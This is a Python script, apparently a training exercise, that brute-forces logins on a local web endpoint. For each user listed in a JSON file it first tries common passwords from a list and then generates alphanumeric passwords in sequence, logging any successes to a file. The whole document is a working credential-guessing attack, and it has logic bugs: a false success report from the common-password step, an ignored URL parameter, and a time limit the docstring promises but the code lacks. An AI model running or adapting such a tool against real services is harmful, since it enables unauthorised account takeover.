import datetime
import json
from datetime import time

import requests


def selection_popular(attack_url, usr_login):
    with open("popular.txt") as db_pass:
        dataset = db_pass.read().split('\n')

    for password in dataset[:20]:
        response = requests.post(attack_url, json={'login': usr_login, 'password': password})
        if response.status_code == 200:
            break

    return password


def selection_password(url, usr_login,alphabet, counter=0, lenght=0):
    base = len(alphabet)
    while True:
        # 1000 == 62 * 16 + 8 == (3 * 16 + 14) * 16 + 8 -> 3(14)8 == 3E8
        password = ''
        number = counter
        while number > 0:
            # number = x * base + rest
            x = number // base
            rest = number % base
            password = alphabet[rest] + password
            number = x
        while len(password) < lenght:
            password = alphabet[0] + password

        response = requests.post('http://127.0.0.1:5000/auth',
                                 json={'login': usr_login, 'password': password})
        if response.status_code == 200:
            break
        if alphabet[-1] * lenght == password:
            lenght += 1
            counter = 0
        else:
            counter += 1
    return password


def attack(url, use_letter=True, use_digits=True, use_symbol=False, use_letters_upper=False):
    """
    Функция создает брутфорс атаку сначала ипользуя простой перебор самых поплуряных паролей
    Затем подбор с помощью генератора(если больше 2 минут остановка)

    :param url: url adress
    :param use_letter: using lower english letter
    :param use_digits: using digits
    :param use_symbol: isung specsymbols
    :param use_letters_upper: using upper english letter
    :return: passwd
    """
    alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'

    with open("user.json") as users_db:
        users_dataset = json.load(users_db)

    user_login = [key for key in users_dataset]
    for usr_logo in user_login:
        res_password = selection_popular(url, usr_logo)
        if res_password:
            with open('pswd_list.txt', 'a') as f:
                f.write(f'SUCCES login:{usr_logo} pswd:{res_password} {datetime.datetime.now()}' + '\n')
            continue
        else:
            res_password = selection_password(url,usr_logo,alphabet)
            if res_password:
                with open('pswd_list.txt', 'a') as f:
                    f.write(f'SUCCES login:{usr_logo} pswd:{res_password} {datetime.datetime.now()}' + '\n')
                continue

if __name__ == "__main__":
    start = attack('http://127.0.0.1:5000/auth')
    # selection_popular('http://127.0.0.1:5000/auth', 'admin')
